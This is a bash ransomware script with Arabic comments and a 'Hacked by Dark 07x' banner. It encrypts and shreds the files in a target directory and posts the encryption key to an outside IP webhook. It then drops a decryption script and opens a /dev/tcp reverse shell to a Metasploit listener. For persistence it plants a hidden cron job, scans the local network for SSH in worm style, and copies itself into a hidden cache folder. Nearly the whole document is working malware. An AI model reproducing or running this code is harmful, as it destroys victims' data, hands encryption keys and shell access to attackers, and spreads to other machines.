#!/bin/bash

# 🧠 إعداد أولي
TARGET_DIR="./test_data"
INSTALL_DIR="$HOME/.cache/.x"
mkdir -p "$INSTALL_DIR"

RAND_NAME=$(head /dev/urandom | tr -dc a-z0-9 | head -c 8)
SCRIPT_NAME="$INSTALL_DIR/.$RAND_NAME.sh"
PASSWORD=$(openssl rand -hex 32)
SELF_DECRYPT_SCRIPT="$INSTALL_DIR/decrypt_me.sh"
WEBHOOK_URL="http://41.111.242.194:2080/"  # ⚠️ عدّل العنوان
LHOST="192.168.0.10"     # ⚠️ IP لـ Metasploit
LPORT="4444"

# 💀 Banner
BANNER='
                      ____             __      ____  _____    
                     / __ \____ ______/ /__   / __ \/__  /  __
                    / / / / __ `/ ___/ //_/  / / / /  / / |/_/
                   / /_/ / /_/ / /  / ,<    / /_/ /  / />  <  
                  /_____/\__,_/_/  /_/|_|   \____/  /_/_/|_|   

        === Hacked  by Dark 07x ===
'
echo "$BANNER"

# 📡 إرسال المفتاح إلى خادم خارجي (C2)
curl -X POST -H "Content-Type: application/json" -d "{\"key\": \"$PASSWORD\"}" "$WEBHOOK_URL" >/dev/null 2>&1 &

# 🔐 تشفير الملفات وأسمائها
echo "[🔒] تشفير الملفات في $TARGET_DIR ..."
find "$TARGET_DIR" -type f ! -name "*.enc" | while read -r file; do
    dir=$(dirname "$file")
    base=$(basename "$file")
    # إضافة "dark-07x-" إلى اسم الملف المشفر
    enc_name="dark-07x-$(echo "$base" | openssl enc -aes-256-cbc -a -salt -k "$PASSWORD" | tr -d '\n' | tr '/+' '_-')"
    openssl enc -aes-256-cbc -salt -in "$file" -out "$dir/${enc_name}.enc" -k "$PASSWORD"
    shred -u "$file"
    echo "✔️ Encrypted: $file"
done

# 🧬 Self-Decryption Script
cat <<EOF > $SELF_DECRYPT_SCRIPT
#!/bin/bash
echo "$BANNER"
echo "[🔓] Starting decryption..."

PASSWORD="$PASSWORD"
TARGET_DIR="$TARGET_DIR"

find "\$TARGET_DIR" -type f -name "*.enc" | while read -r file; do
    dir=\$(dirname "\$file")
    enc_name=\$(basename "\$file" .enc)
    dec_name=\$(echo "\$enc_name" | tr '_-' '/+' | openssl enc -aes-256-cbc -a -d -salt -k "\$PASSWORD")
    openssl enc -d -aes-256-cbc -in "\$file" -out "\$dir/\$dec_name" -k "\$PASSWORD"
    shred -u "\$file"
    echo "✔️ Decrypted: \$dec_name"
done

echo "[✅] Done."
EOF
chmod +x $SELF_DECRYPT_SCRIPT

# 🐚 زرع Reverse Shell (Metasploit)
nohup bash -c "bash -i >& /dev/tcp/192.168.0.10/4444 0>&1" >/dev/null 2>&1 &

# ⏱️ زرع Cron job مخفي
(crontab -l 2>/dev/null; echo "*/20 * * * * bash $SCRIPT_NAME >/dev/null 2>&1") | crontab -

# 🪱 Worm-style Network Scan (simulated only)
echo "[🧬] Scanning LAN (worm-style)..."
for ip in $(ip -o -4 addr show | awk '{print $4}' | cut -d/ -f1 | sed 's/\.[0-9]*$//'); do
    for i in $(seq 1 254); do
        target="\$ip.\$i"
        (timeout 1 bash -c "echo > /dev/tcp/\$target/22" 2>/dev/null && echo "[🌐] SSH open at: \$target") &
    done
done
wait

# 🔁 نسخ نفسه في مجلد التمويه
cp "$0" "$SCRIPT_NAME"
chmod +x "$SCRIPT_NAME"

echo "[⚡] Done. Files encrypted, key exfiltrated, reverse shell launched, worm seeded."
